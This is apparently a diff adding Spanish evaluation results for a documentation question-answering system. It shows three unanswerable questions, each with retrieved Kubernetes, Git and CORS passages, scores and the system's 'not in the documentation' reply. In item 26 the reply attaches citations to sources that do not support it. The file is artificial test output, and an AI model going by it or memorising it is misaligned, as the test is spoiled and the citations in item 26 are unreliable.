+          "texto": "Deployment > Actualizar un Deployment > Sobrescritura (o sea, múltiples actualizaciones a la vez)\n-- lo añadirá a su lista de viejos ReplicaSets y comenzará a reducirlos.  \nPor ejemplo, supongamos que creamos un Deployment para crear 5 réplicas de `nginx:1.7.9`,\npero entonces actualizamos el Deployment para crear 5 réplicas de `nginx:1.9.1` cuando sólo se ha creado 3\nréplicas de `nginx:1.7.9`. En este caso, el Deployment comenzará automáticamente a matar los 3 Pods de `nginx:1.7.9`\nque había creado, y empezará a crear los Pods de `nginx:1.9.1`. Es decir, no esperará a que se creen las 5 réplicas de `nginx:1.7.9`\nantes de aplicar la nueva configuración.",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Actualizar un Deployment > Sobrescritura (o sea, múltiples actualizaciones a la vez)",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0017
+        },
+        {
+          "texto": "Deployment > Crear un Deployment\nEl siguiente ejemplo de un Deployment crea un ReplicaSet para arrancar tres Pods con `nginx`:  \nEn este ejemplo:  \n* Se crea un Deployment denominado `nginx-deployment`, indicado a través del campo `.metadata.name`.\n* El Deployment crea tres Pods replicados, indicado a través del campo `replicas`.\n* El campo `selector` define cómo el Deployment identifica los Pods que debe gestionar.\nEn este caso, simplemente seleccionas una etiqueta que se define en la plantilla Pod (`app: nginx`).\nSin embargo, es posible definir reglas de selección más sofisticadas,\nsiempre que la plantilla Pod misma satisfaga la regla.  \n> **Nota:**\n`matchLabels` es un mapa de entradas {clave,valor}. Una entrada simple {clave,valor} en el mapa `matchLabels`",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Crear un Deployment",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0013
+        },
+        {
+          "texto": "Deployment > Estado del Deployment > Deployment fallido\nDeployment no avanza.  \nEl siguiente comando `kubectl` configura el campo `progressDeadlineSeconds` para forzar al controlador a\ninformar de la falta de avance de un Deployment después de 10 minutos:  \n```shell\nkubectl patch deployment.v1.apps/nginx-deployment -p '{\"spec\":{\"progressDeadlineSeconds\":600}}'\n```\n```\ndeployment.apps/nginx-deployment patched\n```\nUna vez que se ha excedido el vencimiento, el controlador del Deployment añade una DeploymentCondition\ncon los siguientes atributos al campo `.status.conditions` del Deployment:  \n* Type=Progressing\n* Status=False\n* Reason=ProgressDeadlineExceeded  \nVer las convenciones de la API de Kubernetes para más información acerca de las condiciones de estado.  \n> **Nota:**",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Estado del Deployment > Deployment fallido",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0012
+        },
+        {
+          "texto": "Deployment > Crear un Deployment\nes equivalente a un elemento de `matchExpressions` cuyo campo sea la \"clave\", el operador sea \"In\",\ny la matriz de valores contenga únicamente un \"valor\". Todos los requisitos se concatenan con AND.  \n* El campo `template` contiene los siguientes sub-campos:\n* Los Pods se etiquetan como `app: nginx` usando el campo `labels`.\n* La especificación de la plantilla Pod, o el campo `.template.spec`, indica\nque los Pods ejecutan un contenedor, `nginx`, que utiliza la versión 1.7.9 de la imagen de `nginx` de\nDocker Hub.\n* Crea un contenedor y lo llamar `nginx` usando el campo `name`.\n* Ejecuta la imagen `nginx` en su versión `1.7.9`.\n* Abre el puerto `80` para que el contenedor pueda enviar y recibir tráfico.  \nPara crear este Deployment, ejecuta el siguiente comando:  \n```shell",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Crear un Deployment",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0012
+        },
+        {
+          "texto": "Deployment > Crear un Deployment\nnginx-deployment-75675f5897-qqcnn   1/1       Running   0          18s       app=nginx,pod-template-hash=75675f5897\n```  \nEl ReplicaSet creado garantiza que hay tres Pods de `nginx` ejecutándose en todo momento.  \n> **Nota:**\nEn un Deployment, debes especificar un selector apropiado y etiquetas de plantilla Pod (en este caso,\n`app: nginx`). No entremezcles etiquetas o selectores con otros controladores (incluyendo otros Deployments y StatefulSets).\nKubernetes no te impide que lo hagas, pero en el caso de que múltiples controladores tengan selectores mezclados, dichos controladores pueden entrar en conflicto y provocar resultados inesperados.",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Crear un Deployment",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0006
+        }
+      ]
+    },
+    {
+      "id": 26,
+      "tipo": "sin_respuesta",
+      "pregunta": "¿Cuánto cuesta un clúster gestionado de Kubernetes en Google Cloud?",
+      "con_respuesta": false,
+      "referencia": null,
+      "recall5": null,
+      "no_lo_tengo": true,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 10.6,
+      "respuesta": "No lo tengo en la documentación. [1], [2], [3], [4], [5]",
+      "respuesta_cruda": "No lo tengo en la documentación. [1], [2], [3], [4], [5]",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Vista General de Seguridad Cloud Native > Nube (Cloud)\nEn muchos sentidos, la nube (o los servidores o el centro de datos corporativo) es la\nbase de computador confiable\nde un clúster de Kubernetes. Si la capa de la nube es vulnerable (o\nconfigurado de alguna manera vulnerable), por consecuencia no hay garantía de que los componentes construidos\nencima de la base sean seguros. Cada proveedor de la nube tiene recomendaciones de seguridad\npara ejecutar las cargas de trabajo de forma segura en sus entornos.",
+          "fuente": "09-k8s-seguridad-cloud-native.md",
+          "seccion": "Vista General de Seguridad Cloud Native > Nube (Cloud)",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0264
+        },
+        {
+          "texto": "Vista General de Seguridad Cloud Native > Nube (Cloud) > Seguridad del proveedor de la nube\nSi está ejecutando un clúster de Kubernetes en su propio hardware o en un proveedor de nube diferente,\nconsulte la documentación para conocer las mejores prácticas de seguridad.\nA continuación, algunos enlaces a la documentación de seguridad de los proveedores de nube más populares:  \nProveedor IaaS        | Link |\n-------------------- | ------------ |\nAlibaba Cloud | https://www.alibabacloud.com/trust-center |\nAmazon Web Services | https://aws.amazon.com/security/ |\nGoogle Cloud Platform | https://cloud.google.com/security/ |\nHuawei Cloud | https://www.huaweicloud.com/intl/es-us/securecenter/overallsafety |\nIBM Cloud | https://www.ibm.com/cloud/security |\nMicrosoft Azure | https://docs.microsoft.com/en-us/azure/security/azure-security |",
+          "fuente": "09-k8s-seguridad-cloud-native.md",
+          "seccion": "Vista General de Seguridad Cloud Native > Nube (Cloud) > Seguridad del proveedor de la nube",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0192
+        },
+        {
+          "texto": "Vista General de Seguridad Cloud Native > Clúster > Componentes del clúster (su aplicación) {#cluster-applications}\n------------------------------ | --------------------- |\nAutorización RBAC (acceso a la API Kubernetes) | https://kubernetes.io/docs/reference/access-authn-authz/rbac/\nAutenticación | https://kubernetes.io/docs/concepts/security/controlling-access/\nAdministrar secretos en la aplicación (encriptar el etcd - dato en reposo) | https://kubernetes.io/docs/concepts/configuration/secret/  https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/\nPolíticas de seguridad de Pod | https://kubernetes.io/docs/concepts/policy/pod-security-policy/\nCalidad de servicio (y gestión de recursos del clúster) | https://kubernetes.io/docs/tasks/configure-pod-container/quality-service-pod/\nPolíticas de Red | https://kubernetes.io/docs/concepts/services-networking/network-policies/",
+          "fuente": "09-k8s-seguridad-cloud-native.md",
+          "seccion": "Vista General de Seguridad Cloud Native > Clúster > Componentes del clúster (su aplicación) {#cluster-applications}",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0145
+        },
+        {
+          "texto": "¿Qué es Kubernetes?\nEsta página ofrece una visión general sobre Kubernetes.  \nKubernetes es una plataforma portable y extensible de código abierto para\nadministrar cargas de trabajo y servicios. Kubernetes facilita la automatización\ny la configuración declarativa. Tiene un ecosistema grande y en rápido crecimiento.\nEl soporte, las herramientas y los servicios para Kubernetes están ampliamente disponibles.  \nGoogle liberó el proyecto Kubernetes en el año 2014. Kubernetes se basa en la experiencia de\nGoogle corriendo aplicaciones en producción a gran escala por década y media, junto a las mejores ideas y prácticas de la comunidad.",
+          "fuente": "01-k8s-que-es-kubernetes.md",
+          "seccion": "¿Qué es Kubernetes?",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0144
+        },
+        {
+          "texto": "Vista General de Seguridad Cloud Native > Nube (Cloud) > Seguridad de la Infraestructura {#infrastructure-security}\nSugerencias para proteger su infraestructura en un clúster de Kubernetes:  \nÁrea de Interés para la Infraestructura de Kubernetes | Recomendación |\n--------------------------------------------- | -------------- |\nAcceso de red al Plano de Control | Todo acceso público al plano de control del Kubernetes en Internet no está permitido y es controlado por listas de control de acceso a la red estrictas a un conjunto de direcciones IP necesarias para administrar el clúster.|",
+          "fuente": "09-k8s-seguridad-cloud-native.md",
+          "seccion": "Vista General de Seguridad Cloud Native > Nube (Cloud) > Seguridad de la Infraestructura {#infrastructure-security}",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0088
+        }
+      ]
+    },
+    {
+      "id": 27,
+      "tipo": "sin_respuesta",
+      "pregunta": "¿Qué diferencia hay entre GitHub Actions y GitLab CI?",
+      "con_respuesta": false,
+      "referencia": null,
+      "recall5": null,
+      "no_lo_tengo": true,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 8.78,
+      "respuesta": "No lo tengo en la documentación.",
+      "respuesta_cruda": "No lo tengo en la documentación.",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Reorganizar el Trabajo Realizado > Reorganizar vs. Fusionar\nTú no publicarías el primer borrador de tu novela, y el manual de cómo mantener tus programas también debe estar editado con mucho cuidado.\nEsta es el área que utiliza herramientas como `rebase` y `filter-branch` para contar la historia de la mejor manera para los futuros lectores.  \nAhora, sobre si es mejor  fusionar o reorganizar: verás que la respuesta no es tan sencilla.\nGit es una herramienta poderosa que te permite hacer muchas cosas con tu historial, y cada equipo y cada proyecto es diferente.\nAhora que conoces cómo trabajan ambas herramientas, será cosa tuya decidir cuál de las dos es mejor para tu situación en particular.",
+          "fuente": "13-git-rebase.md",
+          "seccion": "Reorganizar el Trabajo Realizado > Reorganizar vs. Fusionar",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0018
+        },
+        {
+          "texto": "Puntos de enganche en Git\nAl igual que en otros sistemas de control de versiones, Git también cuenta\ncon mecanismos para lanzar scripts de usuario cuando suceden ciertas acciones\nimportantes, llamados puntos de enganche (hooks). Hay dos grupos de esos\npuntos de lanzamiento: los del lado\ncliente y los del lado servidor. Los puntos de enganche del lado cliente están relacionados\ncon operaciones tales como la confirmación de cambios (commit) o la fusión\n(merge). Los del lado servidor están relacionados con operaciones tales como\nla recepción de contenidos enviados (push) a un servidor. Estos puntos de\nenganche pueden utilizarse para multitud de aplicaciones. Vamos a ver unas\npocas de ellas.",
+          "fuente": "15-git-hooks.md",
+          "seccion": "Puntos de enganche en Git",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0015
+        },
+        {
+          "texto": "Reorganizar el Trabajo Realizado > Reorganización Básica\n```\n$ git checkout master\n$ git merge experiment\n```  \nAsí, la instantánea apuntada por `C4'` es exactamente la misma apuntada por `C5` en el ejemplo de la fusión.\nNo hay ninguna diferencia en el resultado final de la integración, pero el haberla hecho reorganizando nos deja un historial más claro.\nSi examinas el historial de una rama reorganizada, este aparece siempre como un historial lineal: como si todo el trabajo se hubiera realizado en series, aunque realmente se haya hecho en paralelo.  \nHabitualmente, optarás por esta vía cuando quieras estar seguro de que tus confirmaciones de cambio (commits) se pueden aplicar limpiamente sobre una rama remota; posiblemente, en un proyecto donde estés intentando colaborar, pero no lleves tú el mantenimiento.",
+          "fuente": "13-git-rebase.md",
+          "seccion": "Reorganizar el Trabajo Realizado > Reorganización Básica",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0011
+        },
+        {
+          "texto": "Guardando cambios en el Repositorio > Ver los Cambios Preparados y No Preparados\nIf you are starting to work on a particular area, feel free to submit a PR\nthat highlights your work in progress (and note in the PR title that it's\n```  \n> **Nota:**\nA lo largo del libro, continuaremos usando el comando `git diff` de distintas maneras. Existe otra forma de ver estas diferencias si prefieres utilizar una interfaz gráfica u otro programa externo. Si ejecutas `git difftool` en vez de `git diff`, podrás ver los cambios con programas de este tipo como Araxis, emerge, vimdiff y más. Ejecuta `git difftool --tool-help` para ver qué tienes disponible en tu sistema.",
+          "fuente": "10-git-guardar-cambios.md",
+          "seccion": "Guardando cambios en el Repositorio > Ver los Cambios Preparados y No Preparados",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0005
+        },
+        {
+          "texto": "Guardando cambios en el Repositorio > Ver los Cambios Preparados y No Preparados\nSee our [projects list](https://github.com/libgit2/libgit2/blob/development/PROJECTS.md).\n+# test line\n```  \ny `git diff --cached` para ver que has preparado hasta ahora (--staged y --cached son sinónimos):  \n```\n$ git diff --cached\ndiff --git a/CONTRIBUTING.md b/CONTRIBUTING.md\nindex 8ebb991..643e24f 100644\n--- a/CONTRIBUTING.md\n+++ b/CONTRIBUTING.md\n@@ -65,7 +65,8 @@ branch directly, things can get messy.\nPlease include a nice description of your changes when you submit your PR;\nif we have to read the whole diff to figure out why you're contributing\nin the first place, you're less likely to get feedback and have your change\n-merged in.\n+merged in. Also, split your changes into comprehensive chunks if you patch is\n+longer than a dozen lines.",
+          "fuente": "10-git-guardar-cambios.md",
+          "seccion": "Guardando cambios en el Repositorio > Ver los Cambios Preparados y No Preparados",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0001
+        }
+      ]
+    },
+    {
+      "id": 28,
+      "tipo": "sin_respuesta",
+      "pregunta": "¿Cuál es la capital de Australia?",
+      "con_respuesta": false,
+      "referencia": null,
+      "recall5": null,
+      "no_lo_tengo": true,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 10.0,
+      "respuesta": "No lo tengo en la documentación.",
+      "respuesta_cruda": "No lo tengo en la documentación.",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "¿Qué es Kubernetes? > \n*   ¿Estás listo para empezar?\n*   Para saber más, visita el resto de la documentación de Kubernetes.",
+          "fuente": "01-k8s-que-es-kubernetes.md",
+          "seccion": "¿Qué es Kubernetes? > ",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0
+        },
+        {
+          "texto": "Vista General de Seguridad Cloud Native > Clúster > Componentes del clúster (su aplicación) {#cluster-applications}\n------------------------------ | --------------------- |\nAutorización RBAC (acceso a la API Kubernetes) | https://kubernetes.io/docs/reference/access-authn-authz/rbac/\nAutenticación | https://kubernetes.io/docs/concepts/security/controlling-access/\nAdministrar secretos en la aplicación (encriptar el etcd - dato en reposo) | https://kubernetes.io/docs/concepts/configuration/secret/  https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/\nPolíticas de seguridad de Pod | https://kubernetes.io/docs/concepts/policy/pod-security-policy/\nCalidad de servicio (y gestión de recursos del clúster) | https://kubernetes.io/docs/tasks/configure-pod-container/quality-service-pod/\nPolíticas de Red | https://kubernetes.io/docs/concepts/services-networking/network-policies/",
+          "fuente": "09-k8s-seguridad-cloud-native.md",
+          "seccion": "Vista General de Seguridad Cloud Native > Clúster > Componentes del clúster (su aplicación) {#cluster-applications}",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0
+        },
+        {
+          "texto": "Guardando cambios en el Repositorio > Ignorar Archivos\n*  Los patrones pueden comenzar en barra (`/`) para evitar recursividad.\n*  Los patrones pueden terminar en barra (`/`) para especificar un directorio.\n*  Los patrones pueden negarse si se añade al principio el signo de exclamación (`!`).  \nLos patrones glob son una especie de expresión regular simplificada usada por los terminales.\nUn asterisco (`*`) corresponde a cero o más caracteres; `[abc]` corresponde a cualquier caracter dentro de los corchetes (en este caso a, b o c); el signo de interrogación (`?`) corresponde a un caracter cualquiera; y los corchetes sobre caracteres separados por un guión (`[0-9]`) corresponde a cualquier caracter entre ellos (en este caso del 0 al 9).",
+          "fuente": "10-git-guardar-cambios.md",
+          "seccion": "Guardando cambios en el Repositorio > Ignorar Archivos",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0
+        },
+        {
+          "texto": "Intercambio de recursos de origen cruzado (CORS) > Ejemplos de escenarios de control de acceso > Solicitudes simples\nxhr.open(\"GET\", url);\nxhr.onreadystatechange = someHandler;\nxhr.send();\n```  \nEsta operación realiza un intercambio sencillo entre el cliente y el servidor, utilizando cabeceras CORS para gestionar los privilegios:  \nVeamos lo que el navegador enviará al servidor en este caso:  \n```http\nGET /resources/public-data/ HTTP/1.1\nHost: bar.other\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nConnection: keep-alive\nOrigin: https://foo.example\n```  \nLa cabecera de la solicitud a destacar es Origin que nos indica que la invocación procede de `https://foo.example`.  \nAhora veamos como responde el servidor:  \n```http",
+          "fuente": "17-http-cors.md",
+          "seccion": "Intercambio de recursos de origen cruzado (CORS) > Ejemplos de escenarios de control de acceso > Solicitudes simples",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0
+        },
+        {
+          "texto": "Intercambio de recursos de origen cruzado (CORS) > Ejemplos de escenarios de control de acceso > Solicitudes simples\n[…XML Data…]\n```  \nEn respuesta, el servidor devuelve una cabecera Access-Control-Allow-Origin con `Access-Control-Allow-Origin: *`, lo que significa que se puede acceder al recurso desde **cualquier** origen.  \n```http\nAccess-Control-Allow-Origin: *\n```  \nEste patrón de las cabeceras Origin y Access-Control-Allow-Origin es el uso más sencillo del protocolo de control de acceso. Si los propietarios del recurso en `https://bar.other` desearan restringir el acceso al recurso a las solicitudes procedentes únicamente de `https://foo.example` (es decir, ningún dominio distinto de `https://foo.example` puede acceder al recurso de forma cruzada entre orígenes), enviarían:  \n```http\nAccess-Control-Allow-Origin: https://foo.example\n```  \n> [!NOTE]",
+          "fuente": "17-http-cors.md",
+          "seccion": "Intercambio de recursos de origen cruzado (CORS) > Ejemplos de escenarios de control de acceso > Solicitudes simples",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0
+        }
+      ]
+    }
+  ]
+}
